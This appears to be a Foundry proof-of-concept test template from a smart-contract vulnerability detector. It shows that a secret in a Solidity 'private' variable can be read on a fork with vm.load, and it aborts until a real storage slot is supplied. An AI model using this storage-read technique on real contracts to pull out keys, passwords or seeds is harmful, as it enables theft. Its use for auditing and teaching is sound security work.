// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- "Private" secret is readable on-chain
/// @notice Detector: private-secret. `private` is NOT secret -- every
///         storage slot is public to anyone running a node. A secret
///         (key, password, seed) stored in a `private` variable can be
///         read directly with eth_getStorageAt / vm.load.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set SECRET_SLOT from the target's
///      storage layout (source order / `cast storage` / `forge inspect
///      storage-layout`) AND set SECRET_SLOT_SUPPLIED = true. As shipped
///      (slot unsupplied) the test aborts: slot 0 is ordinary state
///      (owner / balances / flags) in most contracts, so "slot 0 is
///      nonzero" proves nothing. Even adapted, the claim is exactly the
///      precise one worded in the test: the supplied slot holds a nonzero
///      value that anyone can read — nothing stronger.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: storage slot holding the secret (from the target's layout),
    // and SECRET_SLOT_SUPPLIED = true once it is set. The flag ships
    // false so the unadapted harness can never pass on slot 0 by luck.
    uint256 public constant SECRET_SLOT = 0;
    bool public constant SECRET_SLOT_SUPPLIED = false;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(
            SECRET_SLOT_SUPPLIED,
            "34-private-secret: SECRET_SLOT not supplied from the target's storage layout -- slot 0 is ordinary state (owner / balances / flags) in most contracts and its being nonzero proves nothing; set SECRET_SLOT + SECRET_SLOT_SUPPLIED from the layout first"
        );
        bytes32 value = vm.load(target, bytes32(SECRET_SLOT));
        console.log("value at supplied slot:");
        console.logBytes32(value);
        assertTrue(
            value != bytes32(0),
            "slot is zero at the supplied SECRET_SLOT -- no readable value demonstrated at that slot"
        );
        // The claim, worded precisely: this slot of the target holds a
        // nonzero value, and contract storage is public -- anyone running
        // a node can read it with eth_getStorageAt. `private` is not
        // secret. Nothing stronger than that is claimed or proven here.
        console.log("claim: slot holds nonzero data, readable by anyone via eth_getStorageAt -- 'private' is not secret");
    }
}
